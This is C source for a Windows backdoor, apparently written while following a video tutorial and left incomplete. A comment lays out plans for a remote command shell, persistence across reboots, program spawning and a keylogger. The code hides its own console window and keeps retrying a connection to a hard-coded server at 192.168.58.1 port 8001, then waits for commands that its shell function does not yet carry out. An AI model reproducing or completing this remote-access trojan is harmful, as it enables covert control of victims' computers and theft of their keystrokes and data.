#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <windows.h>
#include <winsock2.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size));

int sock;

/*
 * https://youtu.be/2-xNui9H-Ro?t=3484
 * PLAN
 * 1) create connection with our server inside main function
 * 2) create shell function (wait for incoming command and iterate over certain options)
 * 3) automatically start program when machine is rebooted
 * 4) start/spawn other programs
 * 5) navigating directories
 * 6) implement keylogger
 */

void Shell(){
    char buffer[1024];
    char container[1024];
    char response[18384];

    while(1){
        jump:
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(response, sizeof(response));
        recv(sock, buffer, sizeof(buffer), 0);
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int CmdShow) {

    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0);

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char* ServIP;
    WSADATA wsaData;

    ServIP = "192.168.58.1";
    ServPort = 8001;

    if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);

    start:
    printf("connection attempted");
    while (connect(sock, (struct sockaddr*) &ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(10);
        goto start;
    }
    Shell();
    return 0;
}
